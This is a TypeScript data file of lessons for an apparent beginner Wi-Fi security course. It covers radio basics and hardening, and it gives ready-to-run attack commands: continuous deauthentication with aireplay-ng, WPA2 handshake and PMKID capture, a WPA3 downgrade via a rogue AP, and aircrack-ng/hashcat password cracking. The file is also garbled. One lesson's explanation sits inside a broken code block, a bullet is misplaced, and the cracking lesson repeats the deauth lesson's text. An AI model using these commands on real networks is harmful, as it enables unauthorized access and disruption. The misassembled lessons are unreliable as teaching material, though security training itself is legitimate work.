import type { Lesson, Course } from '../types';

const l = (id: string, title: string, instruction: string, extras?: Partial<Lesson>): Lesson => ({
  id, title, instruction, image: null, ...extras,
});

export const LESSONS: Lesson[] = [
    l('wf-1', 'How Wi-Fi Works',
      `Wi-Fi uses **radio waves** to transmit data between devices. Instead of cables, data travels through the air at specific frequencies.

Every Wi-Fi network has:
- **SSID**: the network name you see (e.g., "HomeWiFi")
- **BSSID**: the MAC address of the access point (router)
- **Channel**: the specific frequency used for transmission
- **Band** - 2.4 GHz or 5 GHz

**How devices connect:**
1. Device scans for nearby SSIDs (probe request)
2. Access point responds (probe response)
3. Device sends authentication request
4. Access point authenticates the device
5. Device associates with the network
6. If WPA2 is enabled, the 4-way handshake begins

\`\`\`bash
# Linux: see nearby Wi-Fi networks
iwlist wlan0 scan | grep -E "ESSID|Channel|Signal"

# Or with nmcli
nmcli dev wifi list
\`\`\`

> **Why this matters for hacking:** Wi-Fi networks are a primary entry point for attackers. Understanding SSID, BSSID, channel, and encryption lets you identify target networks and assess their security posture. The \`iwlist wlan0 scan\` command reveals every network in range, including those with hidden SSIDs. Signal strength (PWR) tells you how close the access point is, useful for physical targeting. In wardriving (mapping Wi-Fi networks geographically), these commands are the foundation.

**Mini-challenge:** Run \`iwconfig 2>/dev/null || echo "No wireless interface found"\` to check your Wi-Fi adapter. Then \`iw dev wlan0 scan 2>/dev/null | grep -E "SSID|signal|freq" | head -20\` to see nearby networks. If no wireless interface, install \`sudo apt install wireless-tools\` and check with \`iwconfig\`. This is the starting point for any wireless security assessment.`),

    l('wf-2', '2.4 GHz vs 5 GHz',
      `Wi-Fi operates on two main frequency bands, each with trade-offs.

**2.4 GHz:**
- **Range**: better through walls and obstacles
- **Speed**: slower (max ~600 Mbps theoretical)
- **Channels** - 11-14 channels (only 3 non-overlapping: 1, 6, 11)
- **Interference**: crowded (Bluetooth, microwaves, cordless phones)

**5 GHz:**
- **Range**: shorter, worse through walls
- **Speed**: faster (max ~1.3 Gbps theoretical)
- **Channels**: more channels, less congestion
- **Interference**: less crowded

\`\`\`bash
# Check which band you're connected to (Linux)
iwconfig wlan0 | grep -E "Frequency|Bit Rate"

# Check signal strength
iw dev wlan0 link
\`\`\`

Output shows the frequency (2.4xxx = 2.4 GHz, 5.xxx = 5 GHz) and signal quality in dBm. Signals above \`-70 dBm\` are considered good. Weaker than \`-80 dBm\` means poor connectivity.

**Wi-Fi standards:**
- **802.11b/g/n** - 2.4 GHz (legacy)
- **802.11a/n/ac** - 5 GHz (modern)
> **Why this matters for hacking:** Band selection affects attack methodology. 2.4 GHz penetrates walls better (good for war driving from outside buildings) but is more congested. 5 GHz has more channels and less interference but shorter range. The \`iwconfig\` output shows which band you're connected to - 2.4xxx GHz = 2.4 GHz band, 5.xxx GHz = 5 GHz. Signal strength below \`-80 dBm\` is too weak for reliable connection. Understanding these characteristics helps you position yourself for optimal signal capture.

**Mini-challenge:** Check your current connection quality: \`iw dev wlan0 link 2>/dev/null | head -10\`. If your system supports it, this shows signal strength (dBm), frequency, and bitrate. Compare the value to the guidelines: > -70 dBm (excellent), -70 to -80 (good), < -80 (poor). This skill is essential for assessing whether you can reliably capture traffic from a target network.

- **802.11ax (Wi-Fi 6)**: both bands (latest)`),

    l('wf-3', 'WPA2 & WPA3',
      `**WPA2** (Wi-Fi Protected Access 2) has been the standard since 2004. It uses AES encryption and requires a **pre-shared key (PSK)**, the Wi-Fi password.

**The 4-Way Handshake:**
When a device connects to WPA2:
1. AP sends a random number (ANonce) to the client
2. Client responds with its own random number (SNonce) + a computed value
3. AP sends its computed value + the group key
4. Client confirms

An attacker who captures this handshake can attempt to crack the password offline.

\`\`\`bash
# Capture WPA2 handshake with airodump-ng (Linux, requires monitor mode)
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon

# Target a specific network
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
\`\`\`

**WPA3** is the newer standard (2018). It uses SAE (Simultaneous Authentication of Equals) instead of PSK, making offline cracking much harder.

**WEP** is the old, broken standard. It's trivially crackable in minutes. Never use WEP. Any network still using WEP in 2026 is extremely vulnerable.

\`\`\`bash
# Check encryption type of nearby networks
> **Why this matters for hacking:** The WPA2 4-way handshake is the target of most Wi-Fi cracking attempts. Capturing this handshake requires either waiting for a client to connect naturally or forcing a reconnection with a deauthentication attack. The handshake contains encrypted key material that can be cracked offline with a wordlist. WPA3's SAE (Simultaneous Authentication of Equals) replaces the 4-way handshake with a protocol resistant to offline dictionary attacks. WEP is trivially crackable and should never be used. Identifying the encryption type tells you which attack vectors are viable.

**Mini-challenge:** Run \`nmcli dev wifi list 2>/dev/null | head -10\` to see nearby networks and their security types. If \`nmcli\` isn't available, check what your current connection uses: \`iw dev wlan0 link 2>/dev/null | grep -iE "auth|cipher"\`. Identifying WPA2 vs WPA3 vs WEP on nearby networks is the first step in determining which attack techniques apply.

            nmcli dev wifi list | grep -E "WPA2|WPA3|WEP"
\`\`\``),

    l('wf-4', 'Wireless Reconnaissance',
      `Wireless recon uses tools to discover and analyze nearby networks.

**Essential tools on Linux:**

\`\`\`bash
# iwlist, scan for networks
sudo iwlist wlan0 scan

# airodump-ng, detailed network capture (install aircrack-ng first)
sudo airmon-ng start wlan0    # Enable monitor mode
sudo airodump-ng wlan0mon     # Start capturing
\`\`\`

**What airodump-ng shows:**
\`\`\`
BSSID              PWR  Beacons  #Data  CH  ENC  ESSID
AA:BB:CC:DD:EE:FF  -65   120     42     6  WPA2 HomeWiFi
11:22:33:44:55:66  -72   95      18     1  WPA2 OfficeNet
\`\`\`

- **BSSID** - MAC address of the access point
- **PWR**: signal strength (higher = closer)
- **CH**: channel
- **ENC**: encryption type
- **ESSID**: network name

\`\`\`bash
# Kismet, full-featured wireless sniffer and IDS
sudo kismet

# Wash, detect WPS-enabled networks (install reaver)
sudo wash -i wlan0mon
\`\`\`

> **Why this matters for hacking:** Wireless reconnaissance reveals the full picture of nearby networks. Airodump-ng shows BSSID (MAC), channel, signal strength, encryption type, and number of connected clients. Higher PWR (less negative = stronger signal) means closer to the access point. Kismet adds IDS capabilities, detecting deauth attacks and rogue APs. Wash identifies WPS-enabled routers. WPS PINs can be brute-forced in hours due to a design flaw that splits the 8-digit PIN into two halves (first 4 digits validated separately, reducing entropy from 10^8 to just 11,000 attempts).

**Mini-challenge:** If you have a wireless adapter supporting monitor mode: \`sudo airmon-ng start wlan0 2>/dev/null && sudo airodump-ng wlan0mon 2>/dev/null | head -20\`. If not available, study the command syntax: \`sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon\`. Understanding the command structure prepares you for when you have the right hardware.

**WPS (Wi-Fi Protected Setup)** is a feature that allows PIN-based connection. Many routers have WPS enabled, and the PIN can be brute-forced with tools like \`reaver\` or \`bully\`.`),

    l('wf-5', 'Security Best Practices',
      `Protecting your wireless network is essential. Here's how to secure it.

**For home users:**

\`\`\`bash
# 1. Use WPA2 or WPA3 (never WEP)
# 2. Use a strong password (12+ characters)
# 3. Disable WPS (Wi-Fi Protected Setup)
# 4. Disable SSID broadcasting? (minor benefit, but not real security)
# 5. Enable MAC address filtering (easily bypassed, but adds a layer)
# 6. Keep router firmware updated
# 7. Change default admin credentials
\`\`\`

**Why WPS is dangerous:**
WPS PINs are 8 digits. The last digit is a checksum, so only 7 digits need to be guessed. The protocol validates the first 4 digits separately, reducing the search space to 10,000 + 1,000 = 11,000 possible combinations. A tool like \`reaver\` can crack this in 4-10 hours.

\`\`\`bash
# Check if WPS is enabled on your network (requires monitor mode)
sudo wash -i wlan0mon
\`\`\`

**Enterprise security:**
- Use WPA2-Enterprise with 802.1X authentication instead of PSK
- Deploy a RADIUS server for centralized authentication
- Use EAP-TLS with client certificates for the strongest security
- Regularly audit connected devices

Many organizations also deploy **wireless intrusion detection systems (WIDS)** to detect rogue access points and deauthentication attacks.`, { hasQuiz: true, quiz: [
        { id: 'wf-5-q1', question: 'Why is WPS considered insecure?', options: ['It uses weak encryption', 'The PIN can be brute-forced in hours due to flawed design', 'It only works with WEP', 'It requires a password manager'], correctIndex: 1, explanation: 'WPS PIN validation splits the 8-digit PIN into two halves, making it brute-forceable in 4-10 hours.' },
        { id: 'wf-5-q2', question: 'What is the minimum recommended Wi-Fi security standard in 2026?', options: ['WEP', 'WPA', 'WPA2', 'WPS'], correctIndex: 2, explanation: 'WPA2 with AES is the minimum acceptable standard. WPA3 is preferred where available.' },
      ] }),

    l('wf-6', 'Deauthentication Attacks & Capture',
      `A **deauth attack** disconnects a client from a Wi-Fi network by sending spoofed deauthentication frames. This is used to capture the WPA2 4-way handshake for offline cracking.

**How deauth frames work:**
Wi-Fi management frames (including deauth) are **unencrypted** in WPA2. An attacker can forge these frames without knowing the password.

\`\`\`bash
# Step 1: Enable monitor mode
sudo airmon-ng start wlan0

# Step 2: Find target network and client
sudo airodump-ng wlan0mon

# Step 3: Capture traffic from target (records to capture-01.cap)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Step 4: In another terminal, send deauth packets (0 = continuous)
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
# -0 = deauthentication, 0 = infinite, -a = target BSSID

# Step 5: Client reconnects automatically, capturing the handshake
# Watch for "WPA handshake: AA:BB:CC:DD:EE:FF" in airodump output
\`\`\`

**Verify the handshake was captured:**
\`\`\`bash
# Check if capture file contains handshake
aircrack-ng capture-01.cap | grep "WPA"

# Or use tshark
tshark -r capture-01.cap -Y "eapol" 2>/dev/null
# EAPOL frames = the 4-way handshake messages
\`\`\`

> **Why this matters for hacking:** The deauth attack exploits an unencrypted management frame in WPA2, any device on the same channel can forge a deauthentication packet that appears to come from the access point. The client disconnects and reconnects automatically, generating the 4-way handshake. The \`aireplay-ng -0 0\` command sends continuous deauth frames until stopped. This is the most common technique for capturing WPA2 handshakes for offline cracking. WPA3's Protected Management Frames (PMF) encrypts these frames, preventing deauth attacks.

**Mini-challenge:** (Conceptual — requires wireless hardware in monitor mode.) Study the command chain: \`airmon-ng start wlan0\` → \`airodump-ng wlan0mon\` → \`aireplay-ng -0 2 -a BSSID\`. The -0 (deauth count) of 2 is usually sufficient. Understanding this chain is essential for wireless security testing. Verify captured handshake with \`aircrack-ng capture-01.cap | grep WPA\` or \`tshark -r capture-01.cap -Y "eapol"\`. EAPOL frames = the 4-way handshake messages.

**Why this matters:**
- The captured handshake can be cracked offline (no network connection needed)
- Tools like aircrack-ng, hashcat, and John the Ripper can crack WPA2 PSK
- WPA3's SAE handshake resists this attack, deauth frames don't help against WPA3`),

    l('wf-7', 'PMKID Attack & WPA3',
      `**PMKID attack:** An alternative to the 4-way handshake that doesn't need a client to be connected.

\`\`\`bash
# Capture PMKID with hcxdumptool
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# Convert to hashcat format
hcxpcapngtool -o hash.hc22000 capture.pcapng

# Check if we got PMKIDs
cat hash.hc22000
# Line starting with "WPA*02" = PMKID hash
# Line starting with "WPA*01" = 4-way handshake hash
\`\`\`

**WPA3 and SAE:**
WPA3 replaces PSK with SAE (Simultaneous Authentication of Equals), also known as Dragonfly.

\`\`\`bash
# Key differences:
# - WPA2: PSK known to both sides, 4-way handshake can be captured
# - WPA3: SAE uses a password-authenticated key exchange
#         No handshake to capture! Perfect Forward Secrecy

# Check network security type
nmcli dev wifi list | grep -E "WPA2|WPA3"

# WPA3 Transition Mode (WPA2 + WPA3 on same SSID)
# This is vulnerable because you can force the client to use WPA2
\`\`\`

**Attacking WPA3 Transition Mode:**
1. Deploy a rogue AP that only supports WPA2
2. Client falls back to WPA2
3. Capture the WPA2 handshake as normal
4. Crack the password

> **Why this matters for hacking:** The PMKID attack is superior to deauth-based capture because it doesn't require any connected client, the access point transmits the PMKID during association. This means you can capture the hash from a network that has zero active clients. The hash is computed from the PMK (Pairwise Master Key) and the access point's MAC address. Crack the PMKID and you have the PSK (Wi-Fi password). WPA3's SAE uses a password-authenticated key exchange that prevents offline dictionary attacks entirely. However, WPA3 Transition Mode (dual WPA2/WPA3) allows downgrade attacks.

**Mini-challenge:** (Conceptual) Compare the two capture methods: deauth attack requires a client (more intrusive, leaves evidence), PMKID requires only an AP (less intrusive, no deauth). In authorized penetration tests, PMKID capture is preferred because it doesn't disrupt network operations. Understanding which technique to use in which scenario is the mark of a professional tester.

Always use WPA3-only mode if all your devices support it.`),

    l('wf-8', 'Cracking Wi-Fi Passwords',
      `Once you have a captured handshake or PMKID, crack the password offline.

**Using aircrack-ng (wordlist-based):**
\`\`\`bash
# Crack with a wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Show only the password if found
aircrack-ng -w wordlist.txt -l cracked.txt capture-01.cap
\`\`\`

**Using hashcat (GPU-accelerated):**
\`\`\`bash
# Convert capture to hashcat format
# For .cap files:
aircrack-ng capture-01.cap -j hash
# Output: hash.hccap

# Crack with hashcat
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# Dictionary + rules (more effective)
hashcat -m 22000 hash.hc22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Show cracked password
hashcat -m 22000 hash.hc22000 --show
\`\`\`

**Building a password cracking workflow:**
\`\`\`bash
# 1. Quick check, tiny wordlist first (seconds)
aircrack-ng -w common-passwords.txt capture-01.cap

# 2. RockYou wordlist (minutes to hours)
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# 3. Rule-based with hashcat (more thorough)
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# 4. Mask attack (for known patterns)
hashcat -m 22000 hash.hc22000 -a 3 ?u?l?l?l?d?d?d?d?d
# Pattern: Upper + 4 lower + 5 digits (e.g., "Admin12345")
\`\`\`

**Password patterns that crack easily:**
- Common words (password, admin, summer)
- Company name + digits (acmeco01, qyvora2020)
- Seasons + year (summer2020, winter2021)
- Phone numbers, street names

> **Why this matters for hacking:** The deauth attack exploits an unencrypted management frame in WPA2, any device on the same channel can forge a deauthentication packet that appears to come from the access point. The client disconnects and reconnects automatically, generating the 4-way handshake. The \`aireplay-ng -0 0\` command sends continuous deauth frames until stopped. This is the most common technique for capturing WPA2 handshakes for offline cracking. WPA3's Protected Management Frames (PMF) encrypts these frames, preventing deauth attacks.

**Mini-challenge:** (Conceptual — requires wireless hardware in monitor mode.) Study the command chain: \`airmon-ng start wlan0\` enables monitor mode, \`airodump-ng\` discovers targets, \`aireplay-ng -0 2 -a BSSID\` sends 2 deauth packets. The -0 (deauth count) of 2 is usually sufficient — 0 sends continuously. Understanding this chain is essential for wireless security testing.

**Realistic expectations:**
- Weak passwords (< 8 chars, dictionary words): cracked in seconds
- Moderate passwords (8-10 chars, mixed): hours to days
- Strong passwords (12+ chars, random): effectively uncrackable
- Router default passwords: often cracked in minutes

Always have written permission before attempting to crack any network.`, { hasQuiz: true, quiz: [
        { id: 'wf-8-q1', question: 'What is the PMKID attack advantage over traditional handshake capture?', options: ['It works on WPA3', 'It doesn\'t need a connected client', 'It\'s faster to crack', 'It works on 5 GHz'], correctIndex: 1, explanation: 'PMKID is sent by the AP during association and can be captured without any connected client.' },
        { id: 'wf-8-q2', question: 'Why does WPA3 resist deauth-based handshake capture?', options: ['It encrypts management frames', 'It uses longer passwords', 'It requires biometric auth', 'It doesn\'t use handshakes'], correctIndex: 0, explanation: 'WPA3 uses Protected Management Frames (PMF), which encrypts deauth/disassoc frames, making deauth attacks ineffective.' },
      ] }),
];

export const COURSE: Course = {
  id: 'wifi-fundamentals-101',
  title: 'Wi-Fi Fundamentals 101',
  categoryId: 'wireless',
  description:
    'Understand wireless networks from the radio waves up. Learn about encryption, authentication, and common attacks.',
  overview:
    'Wireless networks are everywhere and often the weakest link. This course covers how Wi-Fi works, the difference between 2.4 GHz and 5 GHz, WPA2/WPA3 encryption, and the basics of wireless reconnaissance and attacks.',
  estimatedMinutes: 55,
  cpCost: 75,
  learningObjectives: [
      'Explain how Wi-Fi uses radio frequencies to transmit data',
      'Understand the difference between 2.4 GHz and 5 GHz bands',
      'Describe WPA2 and WPA3 encryption mechanisms',
      'Identify common wireless attack vectors and mitigations',
  ],
  skillLevel: 'beginner',
  lessons: LESSONS,
};
